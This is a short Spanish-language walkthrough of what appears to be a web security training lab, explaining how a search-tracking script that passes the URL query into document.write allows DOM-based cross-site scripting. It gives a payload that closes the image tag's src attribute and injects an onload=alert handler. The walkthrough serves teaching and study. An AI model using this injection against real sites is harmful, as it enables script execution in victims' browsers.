pongamos cualquier cosa en la barrita de busqueda y vamos a ver lo siguiente

 <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>

esta funcioncita no parece nada hasta que te pones a analizar que esta haciendo es cargar cosas en un img y siempre se carga, asi que podemos aprovechar el onload

y tirar algo como

asdasdsad" onload=alert(11)>

y como sabemos que siempre carga la imagen esto resuelve el laboratorio
